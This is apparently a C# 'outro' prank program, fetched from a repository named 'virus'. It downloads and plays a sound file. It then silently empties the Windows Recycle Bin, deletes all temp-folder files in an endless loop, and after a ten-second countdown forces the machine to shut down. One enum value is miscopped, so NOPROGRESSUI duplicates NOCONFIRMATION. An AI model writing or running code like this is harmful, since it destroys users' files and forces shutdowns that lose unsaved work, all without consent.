using System;
using System.Media;
using System.Threading;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;

namespace Shutdown
{
    internal class Program
    {
        enum RecycleFlag : int
        {
            SHERB_NOCONFIRMATION = 0x00000001,
            SHERB_NOPROGRESSUI = 0x00000001,
            SHERB_NOSOUND = 0x00000004
        }

        [DllImport("Shell32.dll")]
        static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlag dwFlags);

        public static int time = 10;
        static void Main()
        {
            Thread thread = new Thread(new ThreadStart(Cleanup));
            try { Setup(); }
            catch(Exception ex)
            {
                Console.Clear();
                Console.WriteLine("There has been an error, please check the error log.");
                File.WriteAllText("./error.log", ex.ToString());
            }
            thread.Start();
            using (var soundPlayer = new SoundPlayer(@"C:\Users\Public\goofyahh.wav"))
            {
                try
                {
                    soundPlayer.Play();
                }
                catch(Exception ex)
                {
                    Console.Clear();
                    Console.WriteLine("There has been an error, please check the error log.");
                    File.WriteAllText("./error.log", ex.ToString());
                }
            }
            while (time > 0)
            {
                Console.Title = $"Outro - {time}";
                Console.WriteLine($"Shutting down in {time}...");
                time--;
                Thread.Sleep(1000);
            }
            Process.Start("shutdown", "-f /s /t 0");
            Console.ReadKey();
        }
        private static void Setup()
        {
            if (!File.Exists(@"C:\Users\Public\goofyahh.wav"))
            {
                Console.Title = "Outro - Setup";
                Console.WriteLine("Setting up! (This only happens once)");
                WebClient webby = new WebClient();
                webby.DownloadFile("https://github.com/YungSamzy/virus/raw/main/outrov3.wav", @"C:\Users\Public\goofyahh.wav");
                Console.Clear();
            }
        }
        private static void Cleanup()
        {
            SHEmptyRecycleBin(IntPtr.Zero, null, RecycleFlag.SHERB_NOSOUND | RecycleFlag.SHERB_NOCONFIRMATION);
            var files = Directory.GetFiles(Path.GetTempPath(), "*.*", SearchOption.AllDirectories);
            for (; ; )
            {
                foreach (var file in files)
                {
                    try
                    {
                        File.Delete(file);
                    }
                    catch(System.IO.IOException ex)
                    {
                        if (ex.ToString().Contains("cannot access the file"))
                        {
                            //Do nothing
                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.ToString().Contains("cannot access the file"))
                        {
                            //Do nothing
                        }
                        File.WriteAllText("./error.log", ex.ToString());
                    }
                }
            }
        }
    }
}
